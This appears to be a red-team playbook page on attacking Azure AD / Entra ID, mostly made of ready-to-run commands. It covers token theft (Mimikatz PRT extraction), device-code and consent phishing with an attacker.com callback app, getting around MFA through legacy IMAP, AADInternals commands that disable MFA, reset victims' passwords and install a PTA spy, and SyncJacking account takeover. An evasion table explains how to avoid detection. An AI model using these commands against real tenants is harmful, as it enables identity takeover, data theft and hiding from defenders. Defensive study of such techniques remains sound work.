# Azure AD / Entra ID Attacks
> **MITRE ATT&CK**: Credential Access / Persistence > Multiple Techniques
> **Platforms**: Azure / Entra ID (Azure AD) / Microsoft 365
> **Required Privileges**: Low to Medium
> **OPSEC Risk**: Medium-High

## Strategic Overview

Azure AD (rebranded Entra ID) is the central identity plane for Microsoft's entire cloud
ecosystem. It controls access to Azure resources, Microsoft 365, and thousands of
federated SaaS applications. Attacking Azure AD is not just about cloud -- it is about
owning the identity fabric that binds an organization together. A red team lead must
understand that Azure AD attacks often have the highest impact-to-effort ratio in modern
enterprise environments because a single compromised identity can unlock everything.

## Technical Deep-Dive

### PRT (Primary Refresh Token) Abuse

```bash
# PRT overview: SSO token for Azure AD joined devices, stored in TPM
# Grants access to all Azure AD-integrated resources without re-authentication

# Check device registration status
dsregcmd /status
# Look for: AzureAdJoined: YES, AzureAdPrt: YES

# ROADtoken - Extract PRT nonce and session key
ROADtoken.exe
# Outputs PRT cookie that can be used in browser

# RequestAADRefreshToken - Alternative PRT extraction
RequestAADRefreshToken.exe

# Using extracted PRT to get access tokens
# Inject PRT cookie (x-ms-RefreshTokenCredential) into browser
# Navigate to any Azure AD-protected resource - SSO is automatic

# Mimikatz PRT extraction
mimikatz# privilege::debug
mimikatz# sekurlsa::cloudap
# Extracts ProofOfPossessionCookie and KeyValue

# Use PRT to request specific resource tokens
$prtToken = "eyJ..."  # Extracted PRT
$body = @{
    "grant_type"    = "urn:ietf:params:oauth:grant-type:jwt-bearer"
    "assertion"     = $prtToken
    "client_id"     = "29d9ed98-a469-4536-ade2-f981bc1d605e"
    "resource"      = "https://graph.microsoft.com"
    "requested_token_use" = "on_behalf_of"
}
```

### Device Code Phishing -- Advanced Techniques

```bash
# TokenTacticsV2 - Comprehensive token manipulation
Import-Module TokenTacticsV2.psd1

# Initiate device code flow for Microsoft Graph
$deviceCode = Get-DeviceCodeFlow -Client MSGraph
# Displays: "To sign in, use a web browser to open https://microsoft.com/devicelogin
#            and enter the code XXXXXXXXX"

# Automated polling for victim authentication
$tokens = Wait-DeviceCodeFlow -DeviceCode $deviceCode
# Returns: access_token, refresh_token, id_token

# Use refresh token to pivot to other resources
$azureToken = RefreshTo-AzureManagement -RefreshToken $tokens.refresh_token
$graphToken = RefreshTo-MSGraph -RefreshToken $tokens.refresh_token
$outlookToken = RefreshTo-Outlook -RefreshToken $tokens.refresh_token

# Token refresh across resources (token pivoting)
RefreshTo-AzureCoreManagement -RefreshToken $tokens.refresh_token
RefreshTo-DODMSGraph -RefreshToken $tokens.refresh_token
```

### Application Consent Attacks

```bash
# Step 1: Register malicious application in attacker tenant
az ad app create --display-name "IT Security Scanner" \
  --web-redirect-uris "https://attacker.com/callback" \
  --required-resource-accesses '[{
    "resourceAppId":"00000003-0000-0000-c000-000000000000",
    "resourceAccess":[
      {"id":"e1fe6dd8-ba31-4d61-89e7-88639da4683d","type":"Scope"},
      {"id":"570282fd-fa5c-430d-a7fd-fc8dc98a9dca","type":"Scope"},
      {"id":"024d486e-b451-40bb-833d-3e66d98c5c73","type":"Scope"}
    ]
  }]'

# Step 2: Craft admin consent phishing URL
# https://login.microsoftonline.com/TARGET_TENANT/adminconsent?
#   client_id=MALICIOUS_APP_ID&
#   redirect_uri=https://attacker.com/callback&
#   scope=https://graph.microsoft.com/.default

# Step 3: After consent, use app to access target tenant data
$headers = @{Authorization = "Bearer $graphToken"}
Invoke-RestMethod "https://graph.microsoft.com/v1.0/users" -Headers $headers
Invoke-RestMethod "https://graph.microsoft.com/v1.0/me/messages" -Headers $headers
```

### Conditional Access Bypass

```powershell
# Enumerate Conditional Access policies (requires appropriate permissions)
Get-AzureADMSConditionalAccessPolicy | ForEach-Object {
    [PSCustomObject]@{
        Name       = $_.DisplayName
        State      = $_.State
        Conditions = $_.Conditions | ConvertTo-Json -Depth 5
        Controls   = $_.GrantControls | ConvertTo-Json -Depth 3
    }
}

# Common gaps to identify:
# - Policies that exclude specific apps or legacy auth
# - Location-based policies (VPN to allowed location)
# - Device compliance not enforced for all apps
# - Break-glass accounts excluded from all policies

# Legacy authentication bypass (if not blocked)
# IMAP/POP/SMTP do not support MFA
# Use legacy auth to bypass MFA-required CA policies
python3 -c "
import imaplib
m = imaplib.IMAP4_SSL('outlook.office365.com')
m.login('user@target.com', 'password')
m.select('INBOX')
print(m.search(None, 'ALL'))
"

# Compliant device spoofing - Register a device as compliant
# Requires Intune manipulation or device certificate theft
```

### AADInternals -- Full Azure AD Manipulation

```powershell
# Install and import
Install-Module AADInternals
Import-Module AADInternals

# Reconnaissance
Get-AADIntTenantID -Domain target.com
Get-AADIntLoginInformation -Domain target.com
Invoke-AADIntReconAsOutsider -DomainName target.com

# Authenticated enumeration (after obtaining credentials)
Get-AADIntAccessTokenForAADGraph -Credentials $cred
Get-AADIntUsers | Select UserPrincipalName,ObjectId,AccountEnabled
Get-AADIntGlobalAdmins

# MFA manipulation
Get-AADIntUserMFA -UserPrincipalName admin@target.com
Set-AADIntUserMFA -UserPrincipalName admin@target.com -State Disabled

# Password manipulation
Set-AADIntUserPassword -UserPrincipalName victim@target.com -NewPassword "Pwned2024!"

# Azure AD Connect abuse
Get-AADIntSyncCredentials
Set-AADIntPassThroughAuthenticationEnabled -Enabled $false
Install-AADIntPTASpy  # Intercept PTA authentication
```

### ROADtools -- Azure AD Data Collection

```bash
# ROADrecon - Collect Azure AD data
roadrecon auth -u user@target.com -p password
roadrecon gather --mfa   # Gather with MFA (interactive)
roadrecon gather         # Gather all Azure AD data

# Analyze collected data
roadrecon gui            # Launch web UI for analysis
# Browse: Users, Groups, Applications, Service Principals, Roles

# ROADlib - Programmatic access
from roadtools.roadlib.auth import Authentication
auth = Authentication()
auth.authenticate_as_user('user@target.com', 'password')

# Dump all application credentials
roadrecon dump -t applications
roadrecon plugin policies  # Analyze conditional access policies
```

### Token Manipulation & CAE Bypass

```powershell
# Access tokens are JWTs - decode and analyze
$tokenParts = $accessToken.Split('.')
$payload = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String($tokenParts[1] + '=='))
$payload | ConvertFrom-Json

# Continuous Access Evaluation (CAE) - designed to revoke tokens in near-real-time
# CAE bypass: Use tokens for resources that don't support CAE
# Not all Azure services enforce CAE; legacy APIs may honor expired tokens

# Token lifetime: Default 60-90 min for access, 90 days for refresh
# Refresh tokens can be used to get new access tokens indefinitely
# Until: password change, MFA re-registration, or admin revocation

# Revoke refresh tokens (detection: will this alert the SOC?)
Revoke-AzureADUserAllRefreshToken -ObjectId TARGET_USER_GUID
```

---

## 2025 Critical Findings

### CVE-2025-55241: Entra ID Actor Token (CVSS 10.0)

The most severe identity platform vulnerability ever disclosed. An undocumented internal "Actor
Token" mechanism combined with a validation failure in the legacy Azure AD Graph API enabled
cross-tenant impersonation of any user -- including Global Administrators -- in any Entra ID
tenant worldwide.

```
# Attack chain:
# 1. Attacker requests an "Actor Token" from their own benign tenant
#    (Token type designed for internal Microsoft service-to-service comms)
# 2. Legacy Azure AD Graph API fails to validate originating tenant claim
# 3. Attacker presents own tenant's Actor token to target tenant's legacy API
# 4. Target tenant accepts the foreign Actor token
# 5. Attacker authenticates as ANY user including Global Administrator
# Result: Full tenant compromise -- all cloud resources, all identities

# Impact:
# - Read and modify all directory data
# - Create service principals and modify role assignments
# - Take control of applications and policies
# - BYPASSES MFA, Conditional Access, and audit logging
# - Every Entra ID tenant globally was theoretically vulnerable

# Timeline:
# July 14, 2025: Discovered by Dirk-Jan Mollema
# July 14, 2025: Reported to Microsoft
# July 17, 2025: Server-side fix deployed (3-day turnaround)
# September 2025: Public disclosure
# No evidence of in-the-wild exploitation before fix

# Defensive takeaway:
# Legacy Azure AD Graph API endpoints should be fully disabled
# Monitor for tokens with unexpected tenant claims
# Audit service-to-service token flows
```

### SyncJacking -- Entra Connect Hard Matching Account Takeover

Exploits the hard matching mechanism in Microsoft Entra Connect. By cloning the source anchor
(`mS-DS-ConsistencyGuid` / `ImmutableID`) of a target account, an attacker can hijack the
target's Entra ID identity on the next synchronization cycle.

```powershell
# Required permissions (Account Operators group satisfies both):
# - Write-all-Properties or GenericWrite on an unsynchronized on-prem AD account
# - Delete on a synchronized on-prem AD account

# Attack flow:
# Step 1: Copy target's UPN to attacker-controlled account
Set-ADUser -Identity attacker -UserPrincipalName "admin@contoso.onmicrosoft.com"

# Step 2: Clone target's source anchor (mS-DS-ConsistencyGuid)
$targetGuid = (Get-ADUser -Identity targetadmin -Properties mS-DS-ConsistencyGuid)."mS-DS-ConsistencyGuid"
Set-ADUser -Identity attacker -Replace @{"mS-DS-ConsistencyGuid" = $targetGuid}

# Step 3: Delete the original synchronized target account
Remove-ADUser -Identity targetadmin

# Step 4: Wait for Entra Connect sync cycle
# Attacker's account maps to target's Entra ID identity
# Inherits ALL cloud roles including Global Administrator

# Key differentiator from soft matching (prior research):
# Soft matching: Email/SMTP correlation -> account linking
# Hard matching: Primary identity anchor -> complete account takeover
# Hard matching leaves "no trace in on-prem logs and only minimal trace in Entra ID"

# Detection:
# Correlate "Change user password" action immediately followed by
# "Update User" event showing DisplayName modification on the same UPN
# Semperis Directory Services Protector provides behavioral detection

# Microsoft response:
# May 2025: Confirmed as Important privilege escalation
# March 2026: Full enforcement of new protections scheduled
# Interim: Upgrade to latest Entra Connect + disable hard match takeover
```

### Shadow Roles -- Hidden Privilege Escalation Paths

Roles that appear limited but enable escalation to full admin in Azure environments.

```
# Dangerous Azure roles that appear limited but enable full escalation:
| Role                               | Escalation Path                                    |
|------------------------------------|----------------------------------------------------|
| Privileged Role Administrator      | Can assign themselves Global Administrator          |
| Application/Cloud App Admin        | Escalation through sensitive apps (SSO, backups)    |
| Helpdesk Administrator             | Can reset passwords of subscription owners          |
| User Administrator                 | Can modify group memberships to join privileged grps|
| User Access Administrator          | Can grant themselves additional RBAC permissions     |
| Custom RBAC with roleAssignments/* | Equivalent to admin at subscription scope           |

# Detection tool: SkyArk (CyberArk)
# Scans Azure and AWS using read-only permissions to find hidden privileged entities
# github.com/cyberark/SkyArk

# Audit all custom roles for roleAssignments write permissions at broad scopes
# Flag service-linked/default IAM roles with excessive permissions
```

### I SPy -- Escalating to Global Admin via First-Party Service Principals

```
# Datadog Security Labs (January-August 2025)
# MITRE: T1098.003 / T1550.001

# Service principals with Cloud Application Administrator,
# Application Administrator, or Application.ReadWrite.All permission
# can escalate to Global Administrator:

# Attack chain:
# 1. Identify built-in Office 365 Exchange Online service principal
#    Client ID: 00000002-0000-0ff1-ce00-000000000000
# 2. Add credentials to this SP (New-AzureADServicePrincipalKeyCredential)
# 3. Authenticate as the O365 Exchange Online SP
# 4. SP has high-privilege Graph API permissions (Domain.ReadWrite.All)
# 5. Use Domain.ReadWrite.All to create federated domain
# 6. Forge SAML token to authenticate as Global Administrator

# Timeline:
# January 14, 2025: Reported to MSRC
# Initially classified as "expected behavior"
# August 2025: Microsoft resolved the vulnerability

# Key insight: Built-in Microsoft service principals are exploitable
# The "expected behavior" classification reveals a gap in Microsoft's
# threat modeling of first-party applications
```

### UnOAuthorized -- Privilege Elevation Through Microsoft First-Party Apps

```
# Semperis Research (presented at Black Hat)
# MITRE: T1078.004 / T1098.003

# Several Microsoft first-party applications can perform actions
# beyond expected authorization controls:

# Vulnerable applications:
# - Viva Engage / Yammer
# - Microsoft Rights Management Service
# - Device Registration Service

# Critical capability: Add and remove users from privileged roles
# INCLUDING Global Administrator

# Requirements: Application Administrator or Cloud Application Admin role

# Attack path:
# 1. Obtain Application Administrator role
# 2. Add credentials to vulnerable first-party SP
# 3. Authenticate as the first-party SP
# 4. Use SP's implicit permissions to assign Global Admin to attacker
# 5. Escalation enables persistence, lateral movement across
#    Microsoft 365, Azure, and connected SaaS applications

# Resolved by Microsoft after Semperis disclosure
```

### Phantom Sync -- Weaponizing Entra Connect for Undetectable Domain Takeover

```
# Black Hat 2025 research by Dirk-jan Mollema
# MITRE: T1484 / T1550
# Extends SyncJacking concepts to full domain takeover

# Attack methodology:
# 1. Control the sync plane (compromise Entra Connect server)
# 2. Acquire identity material from sync database
# 3. Generate forged assertions for hybrid users
# 4. Impersonate any hybrid user in cloud
# 5. Modify policies or exfiltrate data

# Key insight: Controlling the sync plane enables undetectable
# identity minting in hybrid environments
# No trace in standard monitoring tools

# Entra Connect exploitation guide (Reversec Labs, October 2025):
# - ADSyncCertDump still works despite Microsoft's switch to
#   certificate-based authentication for Connector account
# - Some tools rely on deprecated MSOnline PowerShell / Azure AD Graph
# - Field guide of techniques still viable post-deprecation
```

### "Immortal" Users in Entra ID

```
# Katie Knowles / Entra.news (November 2025)
# MITRE: T1136.003 / T1098

# Technique to create user accounts that RESIST standard deletion
# and remediation procedures

# Exploits hidden layers of Entra's identity system
# Bypasses application locks
# Accounts persist through standard IR cleanup procedures

# Goes beyond standard OAuth app and SP persistence
# Novel persistence technique for long-term access maintenance
```

### Entra ID App Registration Persistence

```
# Guardz Research (June 2025)
# MITRE: T1098.001 / T1136.003

# When a standard user with Owner permissions is compromised:
# 1. Create secrets in the App Registration
#    (New-AzureADApplicationPasswordCredential)
# 2. Establish backdoors via SP authentication
# 3. Perform privilege escalation through delegated permissions

# Service Principals are often overlooked in security reviews
# App Registration secrets survive user password changes
# Multiple secrets can be created for redundant access
```

### SharePoint API Evasion (CVE-2025-53770 / CVE-2025-53771)

```
# Reversec Labs (September 2025, reported March 2025)
# MITRE: T1213.002 / T1562

# Underlying API layers in SharePoint offer attack surfaces
# that evade standard monitoring:
# - CVE-2025-53770: SharePoint API abuse for unmonitored data access
# - CVE-2025-53771: SharePoint API evasion technique

# M365 API layers have unmonitored attack surfaces
# Standard Unified Audit Log may not capture all API-level operations
# Red teams should test SharePoint API access patterns against
# target's detection capabilities
```

### CVE-2026-20965: Windows Admin Center Token Manipulation

```
# Microsoft Security Advisory (2026)
# MITRE: T1550.001 (Application Access Token)

# Vulnerability in Windows Admin Center's Azure SSO that allows
# unauthorized access to VMs and Arc-connected systems via token manipulation

# Azure management tools themselves can become attack vectors
# into hybrid infrastructure

# Attack surface:
# - Windows Admin Center authenticates to Azure via SSO tokens
# - Token manipulation enables unauthorized access to:
#   - Azure Virtual Machines
#   - Azure Arc-connected systems
#   - Other hybrid infrastructure managed through WAC

# Key insight: Management plane tools are high-value targets
# Compromising the tool that manages hybrid resources
# provides lateral movement across both cloud and on-prem
```

### Azure Managed Identity Token Theft via IMDS (2025 Update)

```
# Hunters Security, Cyngular (ThirdHub), Hacking The Cloud, Microsoft (2025)
# MITRE: T1552.005 / T1528

# Adversaries who compromise a resource with an attached Managed Identity
# (VM, Azure Function, App Service) can request short-lived tokens
# through Azure IMDS at:
# http://169.254.169.254/metadata/identity/oauth2/token

# Token theft and replay:
# 1. Compromise resource with attached Managed Identity
# 2. Query IMDS endpoint for OAuth2 access token
# 3. Tokens can be replayed from OUTSIDE the environment
#    to authenticate to other Azure services
# 4. SSRF is one of the most effective extraction methods

# Microsoft mitigation:
# Introduced Metadata Security Protocol (MSP) with a strong
# authentication layer to eliminate SSRF-over-IMDS anti-patterns
# However, MSP adoption is NOT yet widespread
# The MSP adoption gap creates a window for continued exploitation

# Red team testing:
# Test SSRF paths against IMDS on any Azure-hosted resource
# Verify whether MSP enforcement is active on target resources
```

### Golden SAML and Silver SAML Federation Attacks (2025 Context)

```
# CyberArk, Sygnia, Semperis, Datadog Security Labs (2025)
# MITRE: T1606.002 (Forge Web Credentials: SAML Tokens)

# Golden SAML:
# Gain control of federation server's private signing key
# Forge SAML tokens impersonating any user
# Full access to all federated applications and services

# Silver SAML:
# Swipe the private key used to sign SAML responses
# Craft forged responses to log into SPs without contacting Entra ID
# Bypasses Entra ID-side detection entirely

# I SPy research (Datadog, 2025):
# Federated domain settings exploited where anyone with domain's
# registered certificate could forge a SAML token as a target
# hybrid user and authenticate as Global Administrator

# Mitigation:
# - Entra-handled MFA (NOT federated MFA) is required
# - Regular certificate rotation for federation signing keys
# - Monitor federation trust configurations for unauthorized changes

# Federation attacks remain critical persistence and
# escalation paths in 2025
```

---

## Detection & Evasion

| Attack                      | Azure AD Log Event               | Evasion                              |
|-----------------------------|----------------------------------|--------------------------------------|
| PRT theft                   | Sign-in from new device          | Use from same device/network         |
| Device code phishing        | DeviceCodeFlow sign-in           | Looks like legitimate device setup   |
| Consent phishing            | Application consent granted      | Request only read permissions first  |
| AADInternals operations     | Audit log: various               | Use during business hours            |
| CA bypass via legacy auth   | Sign-in with legacy protocol     | Rotate through different protocols   |
| Actor Token abuse           | Minimal (bypassed audit logging) | Fixed server-side (no client action) |
| SyncJacking                 | Password change + Update User    | Minimal on-prem logging              |
| Shadow Roles                | Role assignment events           | Standard admin activity patterns     |
| I SPy SP escalation        | SP credential creation event     | Use existing SP, don't create new    |
| UnOAuthorized first-party   | Role assignment via first-party  | Uses legitimate MS app identity      |
| Phantom Sync               | Sync activity in Entra logs      | Blends with normal sync traffic      |
| Immortal Users             | User creation events             | Bypasses standard cleanup            |
| WAC Token Manipulation     | WAC sign-in / token events       | Uses legitimate management tool      |
| Managed Identity via IMDS  | Token request from IMDS          | Normal instance metadata traffic     |
| Golden/Silver SAML         | Federation trust changes         | Uses legitimate federation flow      |

## Cross-References

- [Azure Initial Access](azure-initial-access.md)
- [Azure Privilege Escalation](azure-privilege-escalation.md)
- [Azure Persistence](azure-persistence.md)
- [Azure Enumeration](azure-enumeration.md) -- Post-auth enumeration of users, groups, roles, and applications
- [Azure Defenses & Bypass](azure-defenses-bypass.md) -- CA bypass, PIM evasion, MFA bypass, and logging evasion
- [Azure Data Mining](azure-data-mining.md) -- Data extraction after identity compromise
- ../12-active-directory-deep-dive/azure-ad-integration.md
- **Credential Guard Bypass** (../../07-credential-access/credential-guard-bypass.md) -- DumpGuard extracts NTLM hashes that may be synced via Entra Connect

## References

- https://github.com/Gerenios/AADInternals
- https://github.com/dirkjanm/ROADtools
- https://github.com/rvrsh3ll/TokenTacticsV2
- https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse
- https://learn.microsoft.com/en-us/entra/identity/conditional-access/
- CVE-2025-55241 Analysis: https://securityonline.info/cve-2025-55241-microsoft-entra-id-flaw-with-cvss-10-0-could-have-compromised-every-tenant-worldwide/
- SyncJacking: https://www.semperis.com/blog/syncjacking-azure-ad-account-takeover/
- SkyArk: https://github.com/cyberark/SkyArk
- I SPy (Datadog): https://securitylabs.datadoghq.com/articles/azure-service-principal-escalation/
- UnOAuthorized (Semperis): https://www.semperis.com/blog/unauthorized-azure-privilege-escalation/
- Phantom Sync (Dirk-jan Mollema): https://dirkjanm.io/phantom-sync-weaponizing-entra-connect/
- Entra Connect Exploitation (Reversec Labs): https://www.reversec.io/blog/entra-connect-2025
- Immortal Users: https://entra.news/p/hacking-entra-id-bypassing-applocks
- SharePoint API CVEs: https://www.reversec.io/blog/staying-sneaky-in-office-365
- CVE-2026-20965 (WAC Token Manipulation): Microsoft Security Advisory
- Managed Identity Token Theft via IMDS: https://hackingthe.cloud/azure/abusing-managed-identities/
- Golden SAML: https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps
- Silver SAML: https://www.semperis.com/blog/silver-saml/
